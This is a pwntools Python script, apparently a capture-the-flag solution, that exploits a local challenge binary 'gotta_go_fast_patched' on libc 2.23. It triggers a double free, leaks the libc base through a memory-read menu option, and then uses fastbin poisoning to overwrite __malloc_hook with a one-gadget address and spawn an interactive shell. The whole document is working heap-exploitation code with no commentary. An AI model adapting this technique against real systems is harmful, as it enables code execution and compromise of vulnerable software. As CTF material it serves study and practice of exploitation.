#!/usr/bin/env python3



from pwn import *


e = ELF("./gotta_go_fast_patched")
r = process("./gotta_go_fast_patched")
libc = ELF("./libc-2.23.so")
def malloc(district,position,name):
    r.sendlineafter(b">",b"0")
    r.sendlineafter(b">",f"{district}")
    r.sendlineafter(b">",f"{position}")
    r.sendlineafter(b"what's their name?",name)

def free(index):
    r.sendlineafter(b">",b"1")
    r.sendlineafter(b">",f"{index}")


def diagnostic(addr):
    r.sendlineafter(b">",b"4")
    r.sendlineafter(b"Just let me know which memory address you need...",f"{addr}")
    r.recvline()
    leak = int(r.recvline(),16)
    libc_base = leak - libc.sym.puts
    return libc_base

def malloc2(district,district2,position,name):
    r.sendlineafter(b">",b"0")
    r.sendlineafter(b">",f"{district}")
    r.sendline(f"{district2}")
    r.sendlineafter(b">",f"{position}")
    r.sendlineafter(b"what's their name?",name)

def malloc3(district,district2,position,position2,name):
    r.sendlineafter(b">",b"0")
    r.sendlineafter(b">",f"{district}")
    r.sendline(f"{district2}")
    r.sendlineafter(b">",f"{position}")
    r.sendline(f"{position2}")
    r.sendlineafter(b"what's their name?",name)


malloc(11,1,b"Ajay")
malloc(12,1,b"Strikerr")
free(0)
free(0)
free(1)
libc_base = diagnostic(e.got.puts)
log.info("The libc base of the process is " + hex(libc_base))
malloc2(13,1,1,p64(libc_base + libc.sym.__malloc_hook - 35))
malloc2(14,1,1,b"B" * 8)
malloc2(15,1,1,b"C" * 8)
malloc(1,1,b"A" * 19 + p64(libc_base + 0xf03a4))
r.sendline(b"0")
r.recvuntil(b"> ")
r.interactive()
